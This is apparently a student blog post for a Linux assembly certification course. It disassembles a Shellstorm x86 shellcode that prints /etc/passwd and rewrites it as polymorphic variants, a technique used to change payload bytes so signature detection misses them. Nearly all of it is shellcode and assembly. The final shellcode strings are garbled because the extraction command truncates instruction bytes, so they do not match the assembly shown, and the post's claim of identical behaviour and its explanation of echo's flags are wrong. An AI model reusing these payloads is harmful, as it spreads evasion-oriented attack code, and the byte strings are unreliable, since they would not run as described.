# Polymorphic conversion of three payloads - part 1

## /bin/cat /etc/passwd

The shellcode chosen for this assignment comes from Shellstorm (Linux/x86 - bin/cat /etc/passwd) and is located at 
<http://shell-storm.org/shellcode/files/shellcode-571.php>.

This shellcode claims to perform a cat on */etc/passwd* and has a length of *43 bytes*. Let's take the shellcode and decompile it. Using *echo* with the -n flag enables the interpretation of backslashes, in this way strings will not be interpreted by the disassembler as instructions.

```
> echo -ne "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | ndisasm -b32 -

00000000  31C0              xor eax,eax
00000002  99                cdq
00000003  52                push edx
00000004  682F636174        push dword 0x7461632f
00000009  682F62696E        push dword 0x6e69622f
0000000E  89E3              mov ebx,esp
00000010  52                push edx
00000011  6873737764        push dword 0x64777373
00000016  682F2F7061        push dword 0x61702f2f
0000001B  682F657463        push dword 0x6374652f
00000020  89E1              mov ecx,esp
00000022  B00B              mov al,0xb
00000024  52                push edx
00000025  51                push ecx
00000026  53                push ebx
00000027  89E1              mov ecx,esp
00000029  CD80              int 0x80
```

In a nutshell the following syscall is used to execute cat and print the */etc/passwd*.

* int execve(const char *filename, char *const argv[], char *const envp[]);

Let's try to modify the syntax of the code without affecting the semantic.

```
; compile with:
; 	nasm -f elf32 shellcode-571-poly-min.asm
;	ld -o shellcode-571-poly shellcode-571-poly-min.o
; extract shellcode with:
; 	objdump -d shellcode-571-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
    _start:
        mov al, 0xb                    ; place the syscall number in the al register
        and eax, 0xF                   ; apply mask to zeroing everything except the syscall number
        cdq                            ; zeroing edx register
        push edx                       ; push on the stack a null address that act as end of string
        mov dword [esp-4], 0x7461632f  ; push on the stack tac/
        mov dword [esp-8], 0x6e69622f  ; push on the stack nib/
        lea ebx, [esp-8]               ; load the address of the string /bin/cat into ebx
        sub esp, 8                     ; adjust esp to allow a correct push 
        push edx                       ; push on the stack a null byte
        mov dword [esp-4], 0x64777373  ; push on the stack dwss
        mov dword [esp-8], 0x61702f2f  ; push on the stack ap//
        mov dword [esp-12], 0x6374652f ; push on the stack cte/ 
        sub esp, 12                    ; adjust esp to allow a correct push 
        mov ecx, esp                   ; store the address to /etc/passwd in ecx 
        push edx                       ; push on the stack a null address that act as a end of array as stated in man 2 execve
        push ecx                       ; push on the stack the address to /etc/passwd
        push ebx                       ; push on the stack the address to /bin/cat
        mov ecx, esp                   ; mov the address that point to the first item of argv in ecx
        int 0x80                       ; interrupt for execve syscall
```

The resulting shellcode does not contains null bytes and is very different from the initial one, however semantically the two shellcodes are identical. This new shellcode is *62 bytes* long.

```
\xb0\x0b\x83\xe0\x0f\x99\x52\xc7\x44\x24\xfc\x2f\x63\x74\xc7\x44\x24\xf8\x2f\x62\x6e\x8d\x5c\x24\xf8\x83\xec\x08\x52\xc7\x44\x24\xfc\x73\x73\x64\xc7\x44\x24\xf8\x2f\x2f\x61\xc7\x44\x24\xf4\x2f\x65\x63\x83\xec\x0c\x89\xe1\x52\x51\x53\x89\xe1\xcd\x80
```

A further modified version might be the following, but the final size of the shellcode is more the 150% of the original: *75 bytes* long.

```
; compile with:
; 	nasm -f elf32 shellcode-571-poly.asm
;	ld -o shellcode-571-poly shellcode-571-poly.o
; extract shellcode with:
; 	objdump -d shellcode-571-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
	_start:
		mov al, 0xb	
		and eax, 0xF 
		cdq
		mov dword [esp-4], edx
		mov dword [esp-8], 0x7461632f
		mov dword [esp-12], 0x6e69622f
		lea ebx, [esp-12]
		mov dword [esp-16], edx
		mov dword [esp-20], 0x64777373
		mov dword [esp-24], 0x61702f2f
		mov dword [esp-28], 0x6374652f
		lea ecx, [esp-28]
		mov dword [esp-32], edx
		mov dword [esp-36], ecx
		mov dword [esp-40], ebx
		lea ecx, [esp-40]
		int 0x80
```

The resulting shellcode:

```
\xb0\x0b\x83\xe0\x0f\x99\x89\x54\x24\xfc\xc7\x44\x24\xf8\x2f\x63\x74\xc7\x44\x24\xf4\x2f\x62\x6e\x8d\x5c\x24\xf4\x89\x54\x24\xf0\xc7\x44\x24\xec\x73\x73\x64\xc7\x44\x24\xe8\x2f\x2f\x61\xc7\x44\x24\xe4\x2f\x65\x63\x8d\x4c\x24\xe4\x89\x54\x24\xe0\x89\x4c\x24\xdc\x89\x5c\x24\xd8\x8d\x4c\x24\xd8\xcd\x80
```

Great! Analysis completed.
 
<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*


